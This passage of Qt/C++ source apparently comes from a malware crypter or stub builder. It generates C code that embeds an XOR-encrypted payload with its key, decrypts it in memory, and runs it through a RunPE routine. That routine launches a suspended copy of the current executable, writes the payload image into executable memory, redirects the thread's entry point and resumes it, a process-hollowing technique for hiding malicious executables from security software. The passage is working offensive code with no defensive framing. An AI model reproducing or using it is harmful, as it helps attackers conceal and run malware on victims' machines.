    code += "size_t payloadSize = " + QString::number(encryptedStub.size()) + ";\n\n";
    
    // Encryption key
    code += "unsigned char key[] = {\n    ";
    for (int i = 0; i < key.size(); i++) {
        code += QString("0x%1").arg((unsigned char)key[i], 2, 16, QChar('0'));
        if (i < key.size() - 1) code += ", ";
    }
    code += "\n};\n";
    code += "size_t keySize = " + QString::number(key.size()) + ";\n\n";
    
    // Decrypt function
    code += "void DecryptPayload(unsigned char* data, size_t dataSize) {\n";
    code += "    for (size_t i = 0; i < dataSize; i++) {\n";
    code += "        data[i] ^= key[i % keySize];\n";
    code += "    }\n";
    code += "}\n\n";
    
    // RunPE function
    code += "BOOL RunPE(void* pImage) {\n";
    code += "    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)pImage;\n";
    code += "    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n";
    code += "    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)pImage + dosHeader->e_lfanew);\n";
    code += "    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;\n\n";
    
    code += "    char exePath[MAX_PATH];\n";
    code += "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n";
    
    code += "    STARTUPINFOA si = {0};\n";
    code += "    PROCESS_INFORMATION pi = {0};\n";
    code += "    si.cb = sizeof(si);\n\n";
    
    code += "    if (!CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n";
    code += "        return FALSE;\n";
    code += "    }\n\n";
    
    code += "    CONTEXT ctx;\n";
    code += "    ctx.ContextFlags = CONTEXT_FULL;\n";
    code += "    GetThreadContext(pi.hThread, &ctx);\n\n";
    
    code += "    PVOID pImageBase = VirtualAllocEx(pi.hProcess, (PVOID)ntHeaders->OptionalHeader.ImageBase,\n";
    code += "        ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n";
    
    code += "    if (!pImageBase) {\n";
    code += "        pImageBase = VirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage,\n";
    code += "            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
    code += "    }\n\n";
    
    code += "    if (!pImageBase) {\n";
    code += "        TerminateProcess(pi.hProcess, 0);\n";
    code += "        return FALSE;\n";
    code += "    }\n\n";
    
    code += "    WriteProcessMemory(pi.hProcess, pImageBase, pImage, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);\n\n";
    
    code += "    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {\n";
    code += "        IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));\n";
    code += "        WriteProcessMemory(pi.hProcess, (BYTE*)pImageBase + section->VirtualAddress,\n";
    code += "            (BYTE*)pImage + section->PointerToRawData, section->SizeOfRawData, NULL);\n";
    code += "    }\n\n";
    
    code += "#ifdef _WIN64\n";
    code += "    ctx.Rcx = (DWORD64)pImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;\n";
    code += "    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 16), &pImageBase, sizeof(PVOID), NULL);\n";
    code += "#else\n";
    code += "    ctx.Eax = (DWORD)pImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;\n";
    code += "    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pImageBase, sizeof(PVOID), NULL);\n";
    code += "#endif\n\n";
    
    code += "    SetThreadContext(pi.hThread, &ctx);\n";
    code += "    ResumeThread(pi.hThread);\n";
    code += "    CloseHandle(pi.hThread);\n";
    code += "    CloseHandle(pi.hProcess);\n";
    code += "    return TRUE;\n";
    code += "}\n\n";
    
    // Main function
    code += "int main() {\n";
    code += "    unsigned char* payload = (unsigned char*)malloc(payloadSize);\n";
    code += "    if (!payload) return 1;\n\n";
    
    code += "    memcpy(payload, encryptedPayload, payloadSize);\n";
    code += "    DecryptPayload(payload, payloadSize);\n\n";
    
    code += "    if (RunPE(payload)) {\n";
    code += "        free(payload);\n";
    code += "        return 0;\n";
    code += "    }\n\n";
    
    code += "    free(payload);\n";
    code += "    return 1;\n";
    code += "}\n";
    
    return code;
}


